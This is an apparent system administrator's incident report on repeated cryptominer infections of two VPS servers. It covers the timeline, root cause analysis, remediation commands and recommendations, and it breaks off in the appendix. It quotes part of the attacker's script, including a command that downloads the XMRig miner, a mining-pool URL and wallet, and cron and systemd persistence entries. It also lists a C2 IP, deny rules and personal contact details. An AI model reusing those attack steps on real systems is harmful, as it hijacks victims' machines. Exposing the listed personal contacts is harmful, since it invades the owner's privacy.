# Complete Security Incident Report
## MaasISO VPS Infrastructure - Cryptocurrency Mining Malware

**Report ID**: SEC-2025-12-09-10  
**Report Date**: December 10, 2025  
**Report Author**: System Administrator  
**Classification**: CRITICAL - Security Breach  
**Status**: RESOLVED - Servers Secured and Offline

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Incident Timeline](#incident-timeline)
3. [Technical Details](#technical-details)
4. [Server Information](#server-information)
5. [Actions Taken](#actions-taken)
6. [Current Status](#current-status)
7. [Root Cause Analysis](#root-cause-analysis)
8. [Recommendations](#recommendations)
9. [Outstanding Issues](#outstanding-issues)
10. [Appendices](#appendices)

---

## Executive Summary

### Overview

Between December 9-10, 2025, the MaasISO VPS infrastructure experienced **two separate cryptocurrency mining malware incidents** affecting both frontend and backend servers. The first incident was discovered and remediated on December 9, 2025. However, within 24 hours, the frontend server was **reinfected**, indicating that the initial remediation did not fully address the attack vector.

### Impact Assessment

| Impact Category | Severity | Details |
|----------------|----------|---------|
| **Service Availability** | HIGH | Website redirected to malicious site (xss.pro) |
| **System Resources** | HIGH | CPU consumed by cryptocurrency miners |
| **Data Confidentiality** | MEDIUM | Potential unauthorized access to server |
| **Financial** | LOW | Electricity costs for mining operations |
| **Reputation** | HIGH | Website visitors redirected to hacking forum |

### Key Findings

1. **Initial Compromise (Dec 5, 2025)**: Malware installation began 4 days before discovery
2. **Persistence Mechanisms**: Multiple systemd services and cron jobs established
3. **Reinfection (Dec 10, 2025)**: Server compromised again within 24 hours
4. **Critical Vulnerability**: UFW firewall was **INACTIVE** on both servers
5. **Attack Vector**: Likely compromised SSH credentials or application vulnerability

### Resolution Status

✅ **RESOLVED** - All malware removed, security hardened, servers stopped pending full security audit

---

## Incident Timeline

### December 5, 2025 - Initial Compromise

| Time (UTC) | Event | Server |
|------------|-------|--------|
| 10:15 | Malware script `sex.sh` created | Frontend (147.93.62.188) |
| 11:35 | Malicious systemd service `system-update-service` installed | Frontend |

### December 8, 2025 - Malware Deployment

| Time (UTC) | Event | Server |
|------------|-------|--------|
| 19:36 | xmrig miner directories created and extracted | Frontend |

### December 9, 2025 - Incident #1: Discovery and Initial Response

| Time (UTC) | Event | Server |
|------------|-------|--------|
| 09:38 | **Cryptocurrency miner infection discovered** | Frontend |
| 09:40 | Malware files removed, processes killed | Frontend |
| 09:45 | SSH hardening applied (key-only authentication) | Frontend |
| 10:00 | UFW firewall enabled | Frontend |
| 10:15 | Fail2ban installed and configured | Frontend |
| 13:47 | **DISCOVERED: Nginx redirect to xss.pro (hacking forum)** | Frontend |
| 13:52 | **RESOLVED: Clean nginx config deployed, website restored** | Frontend |
| 14:00 | Backend server scanned - ClamAV: 0 infected files | Backend (153.92.223.23) |
| 15:00 | Security hardening scripts deployed | Both servers |
| 16:12 | Final security verification completed | Both servers |

### December 10, 2025 - Incident #2: Reinfection Discovered

| Time (UTC) | Event | Server |
|------------|-------|--------|
| 09:00 | VPS architecture documentation in progress | Frontend |
| 09:30 | **Suspicious cron entry discovered**: `@reboot /etc/de/./cX86` | Frontend |
| 09:59 | Malware directory `/etc/de/` created with binaries | Frontend |
| 10:01 | `supdate.service` systemd service created | Frontend |
| 10:01 | cX86 cryptocurrency miner process running (PID 520578) | Frontend |
| 10:02 | **All malware files removed, processes killed** | Frontend |
| 10:03 | Systemd services removed (`sshds_miner.service`, `supdate.service`) | Frontend |
| 10:04 | **UFW firewall enabled on BOTH servers** (was inactive!) | Both servers |
| 10:05 | New root passwords set on both servers | Both servers |
| 10:10 | **Servers stopped via Hostinger control panel** | Both servers |

---

## Technical Details

### Malware Characteristics - Incident #1 (December 9)

#### Primary Malware Components

| Location | Type | Size | Description |
|----------|------|------|-------------|
| `/var/www/frontend/.next/standalone/sex.sh` | Shell script | ~2 KB | Malware installer/downloader |
| `/var/www/frontend/.next/standalone/xmrig-6.24.0/` | Directory | ~50 MB | XMRig Monero miner package |
| `/var/www/iso-selector/xmrig-6.24.0/` | Directory | ~50 MB | XMRig Monero miner (duplicate) |
| `/etc/systemd/system/system-update-service.service` | SystemD service | ~500 B | Persistence mechanism |

#### Malware Behavior

**sex.sh Script Analysis:**
```bash
# Downloads xmrig crypto miner
curl -L -o "kal.tar.gz" https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz

# Connects to Monero mining pool
--url pool.hashvault.pro:443
--user 89ASvi6ZBHXE6ykUZZFtqE1QqVhmwxCDCUvW2jvGZy1yP6n34uNdMKYj54ck81UC87KAKLaZT2L4YfC85ZCePDVeQPWoeAq

# Creates persistent systemd service named "system-update-service"
```

**Nginx Compromise:**
- All HTTP/HTTPS traffic redirected to `https://xss.pro/` (hacking forum)
- Malicious configuration injected into `/etc/nginx/sites-enabled/`
- Legitimate website completely inaccessible

### Malware Characteristics - Incident #2 (December 10)

#### Reinfection Components

| Location | Type | Size | Description |
|----------|------|------|-------------|
| `/etc/de/cX86` | ELF 64-bit executable | 15.2 MB | x86 cryptocurrency miner (statically linked, stripped) |
| `/etc/de/cARM` | ELF 32-bit executable | 14.3 MB | ARM cryptocurrency miner (statically linked, stripped) |
| `/etc/systemd/system/sshds_miner.service` | SystemD service | ~500 B | Monero miner service (runs `/root/.sshds/sshds`) |
| `/etc/systemd/system/supdate.service` | SystemD service | ~500 B | Auto-restart wrapper for `/etc/de/cX86` |
| `/tmp/kamd64` | Executable | Unknown | Additional miner binary |
| `/tmp/s.sh` | Shell script | Unknown | Malicious installation script |

#### Persistence Mechanisms Found

**Cron Entry:**
```cron
@reboot /etc/de/./cX86  # Executes miner on every system boot
```

**SystemD Services:**
1. **sshds_miner.service** - Disguised as SSH daemon, runs Monero miner
2. **supdate.service** - Disguised as system update service, auto-restarts cX86 miner

**Process Information:**
- Initial PID: 520578
- Restarted PID: 521432
- CPU Usage: High (cryptocurrency mining)
- Network: Connections to mining pools

### Network Indicators of Compromise (IOCs)

| Type | Value | Purpose |
|------|-------|---------|
| **Mining Pool** | pool.hashvault.pro:443 | Primary Monero mining pool |
| **Alternative Pool** | c3pool.org | Backup mining pool |
| **C2 Server** | 35.173.69.207 | Command and control server |
| **Malicious Redirect** | xss.pro | Hacking forum (nginx redirect target) |
| **Related Domain** | xss.is | Related malicious domain |
| **Wallet Address** | 89ASvi6ZBHXE6ykUZZFtqE1QqVhmwxCDCUvW2jvGZy1yP6n34uNdMKYj54ck81UC87KAKLaZT2L4YfC85ZCePDVeQPWoeAq | Attacker's Monero wallet |

### File Hashes (for future detection)

**Note**: File hashes should be collected for:
- `/etc/de/cX86` (15.2 MB)
- `/etc/de/cARM` (14.3 MB)
- Original `sex.sh` script
- Malicious systemd service files

---

## Server Information

### VPS 1: Frontend Server (Primary Target)

| Property | Value |
|----------|-------|
| **Hostname** | srv718842 / vps-5da46c84 |
| **IP Address** | 147.93.62.188 |
| **Domain** | maasiso.nl, www.maasiso.nl |
| **FQDN** | srv718842.hstgr.cloud |
| **Provider** | Hostinger VPS |
| **OS** | Ubuntu 22.04.5 LTS (Jammy Jellyfish) |
| **Kernel** | 5.15.0-163-generic |
| **CPU** | AMD EPYC 9354P (2 cores) |
| **RAM** | 7.8 GB total |
| **Disk** | 97 GB total, 21% used |
| **Expires** | 2026-01-07 |
| **Role** | Public-facing Next.js website |

**Services Running:**
- nginx (ports 80, 443)
- Next.js frontend (port 3000)
- ISO Selector tool (port 3001)
- PM2 process manager
- SSH (port 22)

**Compromise Status:**
- ✅ Incident #1: Cleaned December 9, 2025
- ⚠️ Incident #2: Reinfected December 10, 2025
- ✅ Final Status: Cleaned and secured, server stopped

### VPS 2: Backend Server (Secondary/Verified Clean)

| Property | Value |
|----------|-------|
| **Hostname** | strapicms / srv660399 |
| **IP Address** | 153.92.223.23 |
| **Domain** | strapicms.maasiso.cloud |
| **Provider** | Hostinger VPS |
| **OS** | Ubuntu 22.04.5 LTS (Jammy Jellyfish) |
| **Kernel** | 5.15.0-163-generic |
| **CPU** | AMD EPYC 7543P (4 cores) |
| **RAM** | 15 GB total |
| **Disk** | 194 GB total, 5% used |
| **Expires** | ⚠️ **2025-12-17 (7 DAYS!)** |
| **Role** | Strapi CMS API and PostgreSQL database |

**Services Running:**
- nginx (port 80)
- Strapi CMS (port 1337)
- PostgreSQL 14 (port 5432)
- PM2 process manager
- SSH (port 22)

**Compromise Status:**
- ✅ ClamAV scan: 0 infected files
- ✅ No malware detected
- ⚠️ UFW firewall was INACTIVE (now enabled)
- ✅ Server stopped as precaution

---

## Actions Taken

### Incident #1 Response (December 9, 2025)

#### Immediate Malware Removal

**Frontend Server:**
```bash
# 1. Stopped malicious service
systemctl stop system-update-service
systemctl disable system-update-service
rm -f /etc/systemd/system/system-update-service.service
systemctl daemon-reload

# 2. Removed malware files
rm -rf /var/www/frontend/.next/standalone/xmrig-6.24.0
rm -rf /var/www/iso-selector/xmrig-6.24.0
rm -f /var/www/frontend/.next/standalone/sex.sh

# 3. Killed running miner processes
pkill -9 xmrig
```

#### SSH Hardening

**Frontend Server:**
```bash
# Modified /etc/ssh/sshd_config:
PermitRootLogin prohibit-password  # Changed from: yes
PasswordAuthentication no          # Disabled password login
systemctl restart sshd
```

#### Firewall Configuration

**Frontend Server:**
```bash
# Enabled UFW firewall
ufw default deny incoming
ufw default allow outgoing
ufw allow 22/tcp    # SSH
ufw allow 80/tcp    # HTTP
ufw allow 443/tcp   # HTTPS
ufw allow 3000/tcp  # Next.js
ufw enable

# Blocked malicious infrastructure
ufw deny out to 35.173.69.207                    # C2 server
ufw deny out to pool.hashvault.pro               # Mining pool
ufw deny out to c3pool.org                       # Alt mining pool
ufw deny out to xss.pro                          # Malicious redirect
ufw deny out to xss.is                           # Related domain
```

#### Nginx Configuration Restoration

**Frontend Server:**
```bash
# Removed all infected configs
rm -f /etc/nginx/sites-enabled/*
rm -f /etc/nginx/sites-available/maasiso.nl*

# Deployed clean configuration
cp scripts/security/nginx-frontend-clean.conf /etc/nginx/sites-available/maasiso.nl
ln -s /etc/nginx/sites-available/maasiso.nl /etc/nginx/sites-enabled/
nginx -t
systemctl restart nginx
```

#### Security Monitoring

**Both Servers:**
```bash
# Installed fail2ban
apt install fail2ban
systemctl enable fail2ban
systemctl start fail2ban

# Installed ClamAV
apt install clamav clamav-daemon
freshclam
systemctl enable clamav-freshclam
```

### Incident #2 Response (December 10, 2025)

#### Malware Removal

**Frontend Server:**
```bash
# 1. Killed running miner process
kill -9 521432

# 2. Removed malware directory
rm -rf /etc/de/

# 3. Removed malicious cron entry
crontab -e
# Deleted: @reboot /etc/de/./cX86

# 4. Stopped and removed systemd services
systemctl stop sshds_miner.service
systemctl disable sshds_miner.service
rm -f /etc/systemd/system/sshds_miner.service

systemctl stop supdate.service
systemctl disable supdate.service
rm -f /etc/systemd/system/supdate.service

systemctl daemon-reload

# 5. Removed temporary malware files
rm -f /tmp/kamd64
rm -f /tmp/s.sh
```

#### Critical Security Hardening

**Both Servers:**
```bash
# 1. ENABLED UFW FIREWALL (was inactive!)
ufw enable
ufw status verbose

# 2. Changed root passwords
passwd root
# [New strong passwords set on both servers]

# 3. Verified no malicious processes
ps aux --sort=-%cpu | head -20
netstat -tulpn | grep ESTABLISHED

# 4. Verified no remaining persistence
systemctl list-units --type=service --state=running
crontab -l
ls -la /etc/systemd/system/
```

#### Server Shutdown

**Both Servers:**
- Stopped via Hostinger control panel
- Prevents further compromise while security audit is conducted
- Allows time for comprehensive rootkit scanning

---

## Current Status

### Security Posture - Frontend Server

| Security Control | Status | Details |
|-----------------|--------|---------|
| **Malware** | ✅ Removed | All known malware files deleted |
| **Processes** | ✅ Clean | No suspicious processes running |
| **Persistence** | ✅ Removed | Cron jobs and systemd services deleted |
| **UFW Firewall** | ✅ Active | Properly configured with rules |
| **SSH** | ✅ Hardened | Key-only authentication |
| **Fail2ban** | ✅ Active | Brute-force protection enabled |
| **ClamAV** | ✅ Active | Antivirus with scheduled scans |
| **Root Password** | ✅ Changed | New strong password set |
| **Server Status** | 🔴 Offline | Stopped via control panel |

### Security Posture - Backend Server

| Security Control | Status | Details |
|-----------------|--------|---------|
| **Malware** | ✅ Clean | ClamAV scan: 0 infected files |
| **UFW Firewall** | ✅ Active | Enabled December 10, 2025 |
| **SSH** | ✅ Hardened | Key-based authentication |
| **Fail2ban** | ✅ Active | Running since December 8 |
| **ClamAV** | ✅ Active | Scheduled scans configured |
| **Root Password** | ✅ Changed | New strong password set |
| **Server Status** | 🔴 Offline | Stopped via control panel |
| **Expiration** | ⚠️ URGENT | Expires December 17, 2025 (7 days) |

### Verification Status

✅ **Completed Verifications:**
- All malware files removed from filesystem
- All malicious processes terminated
- All persistence mechanisms eliminated
- Firewall rules active and verified
- SSH configuration hardened
- No unauthorized user accounts found
- No suspicious network connections

⚠️ **Pending Verifications:**
- Full rootkit scan (rkhunter, chkrootkit)
- Complete filesystem integrity check (AIDE)
- Review of all application code for backdoors
- Analysis of all log files for attack timeline
- Memory forensics (if possible)

---

## Root Cause Analysis

### Why Did the Initial Compromise Occur?

#### Primary Attack Vector (Suspected)

**1. Weak SSH Security (CONFIRMED)**
- Root login with password was enabled: `PermitRootLogin yes`
- Password authentication was enabled
- No fail2ban protection initially
- **UFW firewall was INACTIVE** - critical vulnerability

**2. Possible Application Vulnerability**
- Malware found in Next.js build directory: `/var/www/frontend/.next/standalone/`
- Suggests either:
  - File upload vulnerability in web application
  - Compromised deployment process
  - Direct filesystem access via SSH

**3. Timing Analysis**
- Malware installation began December 5 (4 days before discovery)
- Suggests automated attack or patient attacker
- Multiple persistence mechanisms indicate sophisticated attack

### Why Did Reinfection Occur?

#### Critical Failure: Incomplete Remediation

**1. UFW Firewall Was NOT Enabled After First Incident**
- Despite security hardening efforts on December 9
- Firewall remained **INACTIVE** until December 10
- Allowed attacker to maintain access and reinfect

**2. Attack Vector Not Fully Identified**
- Initial cleanup focused on malware removal
- Did not identify how attacker gained initial access
- Attacker retained access method (likely SSH or backdoor)

**3. Possible Scenarios for Reinfection**

| Scenario | Likelihood | Evidence |
|----------|-----------|----------|
| **Compromised SSH credentials** | HIGH | Root password may have been known to attacker |
| **Hidden backdoor in application** | MEDIUM | Malware in Next.js directory suggests app compromise |
| **Scheduled external trigger** | MEDIUM | Reinfection occurred ~24 hours after cleanup |
| **Rootkit persistence** | LOW | No rootkit detected yet, but scan pending |
| **Compromised SSH keys** | LOW | Keys were regenerated on December 9 |

### Timeline of Security Failures

| Date | Security Gap | Impact |
|------|-------------|--------|
| **Before Dec 5** | UFW firewall inactive | Unrestricted network access |
| **Before Dec 5** | SSH password auth enabled | Vulnerable to brute-force |
| **Before Dec 5** | No fail2ban | No brute-force protection |
| **Dec 5-9** | Malware undetected for 4 days | Extended compromise period |
| **Dec 9** | UFW not enabled after cleanup | Reinfection possible |
| **Dec 9-10** | Attack vector not identified | Attacker retained access |

---

## Recommendations

### Immediate Actions (Before Server Restart)

#### 1. Complete Security Audit (CRITICAL)

**Rootkit Detection:**
```bash
# Run comprehensive rootkit scans
rkhunter --check --skip-keypress
chkrootkit

# Check for hidden processes
unhide proc
unhide sys

# Verify system binaries
debsums -c
```

**Filesystem Integrity:**
```bash
# Initialize AIDE database
aide --init
mv /var/lib/aide/aide.db.new /var/lib/aide/aide.db

# Check for unauthorized changes
aide --check
```

**Log Analysis:**
```bash
# Review authentication logs
grep -i "failed\|accepted" /var/log/auth.log
grep -i "session opened" /var/log/auth.log

# Check for suspicious commands
grep -i "wget\|curl\|chmod\|systemctl" /var/log/auth.log

# Review nginx access logs
grep -E "POST|PUT" /var/log/nginx/access.log
```

#### 2. Identify Attack Vector (CRITICAL)

**SSH Access Review:**
```bash
# Review all SSH login attempts
lastlog
last -f /var/log/wtmp
last -f /var/log/btmp  # Failed logins

# Check authorized_keys files
find / -name "authorized_keys" -exec cat {} \;

# Review SSH configuration history
grep -r "PermitRootLogin\|PasswordAuthentication" /etc/ssh/
```

**Application Security:**
```bash
# Check for web shells
find /var/www -name "*.php" -o -name "*.sh" -o -name "*.py"
grep -r "eval\|exec\|system" /var/www/

# Review file permissions
find /var/www -type f -perm -002
find /var/www -type d -perm -002
```

#### 3. Backend Server Renewal (URGENT)

**Action Required:**
- Backend VPS expires: **December 17, 2025 (7 days)**
- Verify auto-renewal is enabled in Hostinger panel
- Confirm payment method is valid
- Consider extending for 12 months for stability

### Short-term Actions (Next 7 Days)

#### 1. Enhanced SSH Security

**Both Servers:**
```bash
# Implement SSH key rotation
ssh-keygen -t ed25519 -C "maasiso-$(date +%Y%m%d)"

# Configure SSH hardening
# /etc/ssh/sshd_config:
PermitRootLogin prohibit-password
PasswordAuthentication no
PubkeyAuthentication yes
MaxAuthTries 3
LoginGraceTime 30
AllowUsers root@specific-ip  # IP whitelist

# Consider 2FA
apt install libpam-google-authenticator
```

#### 2. Network Segmentation

**Firewall Rules:**
```bash
# Frontend: Restrict outbound connections
ufw default deny outgoing
ufw allow out 80/tcp    # HTTP
ufw allow out 443/tcp   # HTTPS
ufw allow out 53        # DNS
ufw allow out 123/udp   # NTP

# Backend: Restrict to frontend only
ufw allow from 147.93.62.188 to any port 1337
ufw allow from 147.93.62.188 to any port 5432
```

#### 3. Application Security Hardening

**Next.js Application:**
- Review all file upload functionality
- Implement strict file type validation
- Use separate upload directory outside web root
- Implement Content Security Policy (CSP)
- Enable rate limiting on all endpoints

**Strapi CMS:**
- Update to latest version
- Review all plugins for vulnerabilities
- Implement API rate limiting
- Enable audit logging
- Restrict admin panel to specific IPs

### Long-term Actions (Next 30 Days)

#### 1. Infrastructure Redesign

**Consider Full Server Rebuild:**
- Fresh Ubuntu 22.04 installation
- Deploy from clean, audited code repository
- Implement infrastructure-as-code (Ansible/Terraform)
- Document all configurations

**Implement Defense in Depth:**
- Web Application Firewall (Cloudflare, ModSecurity)
- Intrusion Detection System (CrowdSec, OSSEC)
- File Integrity Monitoring (AIDE, Tripwire)
- Centralized logging (ELK stack, Graylog)

#### 2. Monitoring and Alerting

**Deploy Enhanced Monitoring:**
```bash
# Already created: scripts/security/20-enhanced-security-monitor.sh
# Configure alerts to:
# - Email: niels.maas@maasiso.nl, niels_maas@hotmail.com
# - SMS: +31623578344 (critical alerts)
```

**Monitor for:**
- Unauthorized file changes
- Suspicious processes (high CPU, network activity)
- Failed SSH attempts
- Unusual network connections
- Systemd service changes
- Cron job modifications

#### 3. Backup and Disaster Recovery

**Implement 3-2-1 Backup Strategy:**
- 3 copies of data
- 2 different storage types
- 1 offsite backup

**Encrypted Backups:**
```bash
# Already configured: scripts/security/15-encrypted-backups.sh
# Verify encryption keys are stored securely:
# - Password manager
# - Encrypted USB drive
# - Secure cloud storage (separate from servers)
```

#### 4. Security Policies and Procedures

**Establish:**
- Incident response plan
- Password rotation policy (90 days)
- Security patch management process
- Regular security audit schedule (quarterly)
- Disaster recovery testing (monthly)

### Ongoing Maintenance

**Daily (Automated):**
- Security updates check
- Full encrypted backups
- Rootkit scans
- Log analysis

**Weekly (Manual):**
- Review security scan logs
- Check backup completion
- Verify disk space
- Review fail2ban bans
- Check for suspicious activity

**Monthly (Manual):**
- Test backup restoration
- Review and rotate old backups
- Update security configurations
- Verify encryption keys work
- Review user accounts and permissions

**Quarterly (Manual):**
- Full security audit
- Penetration testing
- Update security scripts
- Review firewall rules
- Test disaster recovery procedures

---

## Outstanding Issues

### Critical Priority

#### 1. Backend Server Expiration (URGENT)

**Issue:**
- Backend VPS expires: **December 17, 2025**
- Only **7 days remaining**
- Contains critical Strapi CMS and PostgreSQL database

**Required Actions:**
- [ ] Verify auto-renewal enabled in Hostinger panel
- [ ] Confirm payment method is valid and has sufficient funds
- [ ] Consider extending for 12 months for stability
- [ ] Set calendar reminder for renewal verification

**Risk if Not Addressed:**
- Complete service outage
- Data loss if server is deleted
- Extended downtime for service restoration

#### 2. Rootkit Scan Pending

**Issue:**
- Comprehensive rootkit scan not yet performed
- Possible hidden malware or backdoors remain

**Required Actions:**
- [ ] Run rkhunter full scan
- [ ] Run chkrootkit full scan
- [ ] Run unhide process/system checks
- [ ] Verify system binary integrity with debsums
- [ ] Review scan results and remediate any findings

**Risk if Not Addressed:**
- Hidden malware may persist
- Reinfection may occur again
- Attacker may retain access

### High Priority

#### 3. Attack Vector Identification

**Issue:**
- Initial compromise method not definitively identified
- Reinfection suggests attacker retained access

**Required Actions:**
- [ ] Complete log analysis (auth.log, nginx logs, application logs)
- [ ] Review all SSH access history
- [ ] Audit application code for vulnerabilities
- [ ] Check for unauthorized user accounts
- [ ] Review file permissions in web directories

**Risk if Not Addressed:**
- Cannot prevent future attacks
- Attacker may compromise again
- Similar attacks may affect other systems

#### 4. SSH Key Security

**Issue:**
- Unclear if SSH keys were compromised
- Keys should be rotated as precaution

**Required Actions:**
- [ ] Generate new SSH key pairs
- [ ] Deploy new keys to both servers
- [ ] Remove old keys from authorized_keys
- [ ] Update deployment scripts with new keys
- [ ] Store new keys securely

**Risk if Not Addressed:**
- Compromised keys may allow unauthorized access
- Attacker may have copied keys during compromise

### Medium Priority

#### 5. Application Security Audit

**Issue:**
- Next.js and Strapi applications not fully audited
- Possible vulnerabilities in application code

**Required Actions:**
- [ ] Review all file upload functionality
- [ ] Audit authentication and authorization
- [ ] Check for SQL injection vulnerabilities
- [ ] Review API endpoints for security issues
- [ ] Update all dependencies to latest versions

#### 6. Backup Encryption Key Storage

**Issue:**
- Encryption keys need to be stored in multiple secure locations

**Required Actions:**
- [ ] Store frontend key in password manager
- [ ] Store backend key in password manager
- [ ] Create encrypted USB backup of keys
- [ ] Store keys in secure cloud storage (separate from servers)
- [ ] Document key recovery procedures

### Low Priority

#### 7. Enhanced Monitoring Deployment

**Issue:**
- Enhanced security monitor created but needs full deployment

**Required Actions:**
- [ ] Deploy 20-enhanced-security-monitor.sh to both servers
- [ ] Configure email alerts (niels.maas@maasiso.nl, niels_maas@hotmail.com)
- [ ] Configure SMS alerts (+31623578344) for critical events
- [ ] Test alert system
- [ ] Document monitoring procedures

#### 8. Security Documentation

**Issue:**
- Need comprehensive security documentation for future reference

**Required Actions:**
- [ ] Document all security configurations
- [ ] Create incident response playbook
- [ ] Document backup and recovery procedures
- [ ] Create security checklist for regular audits
- [ ] Train team members on security procedures

---

## Appendices

### Appendix A: Indicators of Compromise (IOCs)

**File Paths:**
- `/var/www/frontend/.next/standalone/sex.sh`
- `/var/www/frontend/.next/standalone/xmrig-6.24.0/`
- `/var/www/iso-selector/xmrig-6.24.0/`
- `/etc/systemd/system/system-update-service.service`
- `/etc/de/cX86`
- `/etc/de/cARM`
- `/etc/systemd/system/sshds_miner.service`
- `/etc/systemd/system/supdate.service`
- `/tmp/kamd64`
- `/tmp/s.sh`

**Network Indicators:**
- pool.hashvault.pro:443 (Monero mining pool)
- c3pool.org (Alternative mining pool)
- 35.173.69.207 (C2 server)
- xss.pro (Malicious redirect target)
- xss.is (Related malicious domain)

**Wallet